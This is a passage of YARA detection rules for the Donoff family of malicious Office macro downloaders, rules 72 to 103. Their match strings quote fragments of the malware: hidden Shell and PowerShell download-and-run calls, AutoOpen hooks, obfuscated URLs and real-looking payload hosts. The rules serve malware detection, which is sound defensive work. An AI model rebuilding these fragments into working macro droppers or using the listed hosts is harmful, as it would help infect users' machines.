        $x_1_4 = "'St','ocess','art','-Pr'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_72
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"wscript \" + fs.GetSpecialFolder(2) + \"/js.js\"" ascii //weight: 1
        $x_1_2 = "'tStrings(\"\"%TEM';" ascii //weight: 1
        $x_1_3 = "+= '\"\"GET\"\",\"\"http:/'; " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_73
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "CallByName SubProperty, \"Open\" + \"\", VbMethod" ascii //weight: 3
        $x_3_2 = {3d 20 43 61 6c 6c 42 79 4e 61 6d 65 28 [0-15] 2c 20 22 72 65 73 22 20 2b 20 22 70 6f 6e 73 65 42 6f 22 20 2b 20 22 64 79 22 2c 20 56 62 47 65 74 29}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_74
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "QhtBtQpj:R8/j/mR8anBnRQaR-RacjRtzivQ8eRw8eajr8.QQc8omQ/RBsyzRsRtjemQ/8BcajRcQhBez/u8pBdQa8jtejB.e8Bxze" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_75
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 53 75 62 20 [0-16] 28 42 79 56 61 6c 20 [0-16] 20 41 73 20 53 74 72 69 6e 67 29 [0-4] 53 65 74 20 [0-16] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 64 28 22 [0-64] 22 2c 20 22 [0-64] 22 29 29 [0-64] 2e 52 75 6e 20 [0-32] 2c 20 [0-8] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_76
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sorry, we ran into a problem" ascii //weight: 1
        $x_1_2 = "Go online to look for additional help" ascii //weight: 1
        $x_1_3 = {3d 20 53 68 65 6c 6c 28 [0-8] 28 [0-8] 29 2c [0-16] 29 [0-2] 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_77
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 72 31 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? ?? ?? ?? ?? 29}  //weight: 1, accuracy: Low
        $x_1_2 = {50 75 62 6c 69 63 20 43 6f 6e 73 74 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? 20 3d 20 22 42 41 53 45 36 34 22}  //weight: 1, accuracy: Low
        $x_1_3 = ".dataType = \"bin.base64\"" ascii //weight: 1
        $x_1_4 = {53 74 72 52 65 76 65 72 73 65 28 ?? ?? ?? ?? ?? ?? ?? ?? ?? 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_78
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"ShellExecuteA\" (ByVal" ascii //weight: 1
        $x_1_2 = "Lib \"urlmon\" Alias _" ascii //weight: 1
        $x_1_3 = "Environ$(\"tmp\") & \"\\\" &" ascii //weight: 1
        $x_1_4 = "= StrReverse(" ascii //weight: 1
        $x_2_5 = "00;quui" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_79
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"cmd.\"" ascii //weight: 1
        $x_1_2 = "= \"exe \"" ascii //weight: 1
        $x_1_3 = "= \"ttp:\"" ascii //weight: 1
        $x_1_4 = "= \"GET\"\"\"" ascii //weight: 1
        $x_1_5 = ".Run (" ascii //weight: 1
        $x_1_6 = ".AddCode (" ascii //weight: 1
        $x_1_7 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a [0-32] 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_80
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 [0-32] 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 [0-4] 44 69 6d 20 [0-80] 20 3d 20 [0-16] 2e [0-16] 2e 54 65 78 74 [0-4] 53 68 65 6c 6c 20 28 [0-16] 2e [0-16] 2e 54 65 78 74 20 26 20 [0-48] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_81
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 70 6c 69 74 28 22 05 00 [0-21] 2e 02 00 [0-4] 2f 38 37 38 68 66 33 33 66 33 34 66 2b 05 00 [0-21] 2e 02 00 [0-4] 2f 38 37 38 68 66 33 33 66 33 34 66}  //weight: 1, accuracy: Low
        $x_1_2 = {22 73 22 20 2b 20 05 00 [0-21] 20 2b 20 22 69 6c 65 22 2c 20 56 62 4d 65 74 68 6f 64 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_82
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"TMP\", Optional RunAfterDownload" ascii //weight: 1
        $x_1_2 = "If RunHide = True Then" ascii //weight: 1
        $x_1_3 = "Shell FullSavePath, vbHide" ascii //weight: 1
        $x_1_4 = ".Open \"GET\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_83
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " = Array(\" \"\"\")(0)" ascii //weight: 1
        $x_1_2 = " = Array(\"  \")(0)" ascii //weight: 1
        $x_1_3 = " = Array(\"xE\")(0)" ascii //weight: 1
        $x_1_4 = " = Array(\"^ \")(0)" ascii //weight: 1
        $x_1_5 = " = Array(\"XE\")(0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_84
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CvgNPkMRfpKXLxYvuVDUGKlLW(\"fyf/oop0of0ch0ufo/ufospsl00;quui\")" ascii //weight: 1
        $x_1_2 = "CvgNPkMRfpKXLxYvuVDUGKlLW(\"fyf/tztutpi\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_85
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"Do^\" & \"wn\" & \"lo^ad\" & \"Fi\" & \"^le('ht\" & \"^t^p" ascii //weight: 1
        $x_1_2 = "Hea^ders.Ad^d\" & \"('Us^er-Ag^ent',\" & \"'Mozilla/4.0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_86
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-15] 28 56 42 41 2e 45 6e 76 69 72 6f 6e 24 28 22 74 65 6d 70 22 29 20 26 20 22 5c [0-15] 2e 65 78 65 22 2c 20 58 54 4d 59 4e 29 3a 20 43 61 6c 6c 20 53 68 65 6c 6c 28 56 42 41 2e 45 6e 76 69 72 6f 6e 24 28 22 74 45 6d 50 22 29 20 26 20 22 5c [0-15] 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_87
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"http://46.30.45.1\" + \"35/999.\" + \"jp\" + \"g\"" ascii //weight: 1
        $x_1_2 = "\"http://4\" + \"6.\" + \"30.45.135/\" + \"999\" + \".\" + \"jp\" + \"g\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_88
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd.e" ascii //weight: 1
        $x_1_2 = "xe /c" ascii //weight: 1
        $x_1_3 = "\"p^o" ascii //weight: 1
        $x_1_4 = "wers" ascii //weight: 1
        $x_1_5 = "hell" ascii //weight: 1
        $x_1_6 = ".ex^e" ascii //weight: 1
        $x_1_7 = "-^ex" ascii //weight: 1
        $x_1_8 = "ecu^t" ascii //weight: 1
        $x_1_9 = "ion^p" ascii //weight: 1
        $x_1_10 = "ol^i" ascii //weight: 1
        $x_1_11 = "do^wn" ascii //weight: 1
        $x_1_12 = "dfile" ascii //weight: 1
        $x_1_13 = "ttp:/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_89
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h[Q/uimgs]ogcEmaQEg[Ry;acuhgcuRsialiuhhaiEs/l" ascii //weight: 1
        $x_1_2 = "iiksvoramaT = maskoforos(Int((cn123456 * Rnd()) + kittyjared))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_90
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {20 41 73 20 53 74 72 69 6e 67 29 [0-16] 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 75 6e [0-16] 2c 20 30 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 63 68 72 77 28 [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_91
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " = (\".E\")" ascii //weight: 1
        $x_1_2 = " = (\"xE\")" ascii //weight: 1
        $x_1_3 = " = TypeName(ActiveDocument.CodeName) = \"String\"" ascii //weight: 1
        $x_1_4 = " = (\"/C\")" ascii //weight: 1
        $x_1_5 = {20 3d 20 28 22 5e 73 22 29 0d 0a 53 65 6c 65 63 74 20 43 61 73 65}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_92
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= ThisDocument.Bookmarks.Count" ascii //weight: 1
        $x_1_2 = "<> 2 Then" ascii //weight: 1
        $x_1_3 = ".Show" ascii //weight: 1
        $x_1_4 = "If 184 = Len(" ascii //weight: 1
        $x_1_5 = {53 68 65 6c 6c 20 [0-8] 2c 20 4c 65 6e 28 [0-8] 29 20 2d 20 31 38 34}  //weight: 1, accuracy: Low
        $x_1_6 = ".Text" ascii //weight: 1
        $x_1_7 = "Chr$(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_93
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 22 78 65 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 22 68 74 74 70 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {20 3d 20 22 3a 2f 2f 74 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {20 3d 20 22 68 2e 70 68 22 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_94
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "WRun & \"\\UpdOffice.exe\"" ascii //weight: 2
        $x_2_2 = "\"\\UpdateWinrar.js\"" ascii //weight: 2
        $x_1_3 = "\"ipt.Shell\"" ascii //weight: 1
        $x_1_4 = "(\"Co\" & \"de\").Range(\"" ascii //weight: 1
        $x_1_5 = "\"War\" & \"ning\"" ascii //weight: 1
        $x_1_6 = "WRun = \"%TMP%\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_95
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 42 22 0d 0a [0-16] 20 3d 20 22 6f 22 0d 0a [0-16] 20 3d 20 22 27 22 0d 0a [0-16] 20 3d 20 22 54 22 0d 0a [0-16] 20 3d 20 22 20 22 0d 0a [0-16] 20 3d 20 22 20 22 0d 0a [0-16] 20 3d 20 22 5e 22 0d 0a [0-16] 20 3d 20 22 25 22 0d 0a [0-16] 20 3d 20 22 3d 22 0d 0a}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 53 68 65 6c 6c 28 [0-8] 2c 20 46 61 6c 73 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_96
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20200102 Firefox/50.0" ascii //weight: 1
        $x_1_2 = "Array(\"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\", \"H\", \"I\", \"J\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_97
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"hdxjFsLXCntETyUrVzmfm.mkqnnw/aowt/umbaga/uwk.ibvikbmupmu//:xbbp" ascii //weight: 1
        $x_1_2 = "\"qzgAcfHEebUJDovNyORYKUFlbvVdOJLjHYkIbpjNoFsTYaBiqMOLfJ\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_98
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"T\" & \"M\" & \"P\" & \"%\"" ascii //weight: 1
        $x_1_2 = {3d 20 22 28 22 20 26 20 22 27 22 20 26 20 22 44 22 20 26 20 22 6f 22 20 26 20 22 77 22 [0-32] 3d 20 22 6e 22 20 26 20 22 6c 22 20 26 20 22 27 22 20 26 20 22 2b 22 20 26 20 22 27 22}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"s\" & \"t\" & \"a\" & \"r\" & \"T\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_99
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "somehernya_1 = CreateObject(dikenson(0))" ascii //weight: 1
        $x_1_2 = "dikenson = Split(UserForm1.Label1.Caption, \"/\")" ascii //weight: 1
        $x_1_3 = {2e 52 75 6e 20 22 63 22 20 26 20 53 74 72 52 65 76 65 72 73 65 28 [0-30] 26 20 22 64 69 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_100
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ")) Xor CInt(" ascii //weight: 1
        $x_1_2 = "Chr(Asc(Mid(" ascii //weight: 1
        $x_1_3 = " Mod Len(" ascii //weight: 1
        $x_1_4 = "ActiveDocument.Variables(\"" ascii //weight: 1
        $x_1_5 = {53 68 65 6c 6c 20 [0-16] 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
        $x_1_6 = "Array(NaN, NaN, NaN, NaN, NaN," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_101
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"//sacrificery.top/ll/ldd.php'," ascii //weight: 1
        $x_1_2 = "\"('Us^er-Ag^ent','Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)');\"" ascii //weight: 1
        $x_1_3 = "%TEMP%.e^xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_102
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= PRKsuVOb & Chr(FANUo8nzX1niT3V(S3m8cvPikr))" ascii //weight: 1
        $x_1_2 = "FANUo8nzX1niT3V = Split(PRKsuVOb, \",\")" ascii //weight: 1
        $x_1_3 = "G87v49IzYIThwz(PRKsuVOb, In8aXdjmkzT2J" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_103
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
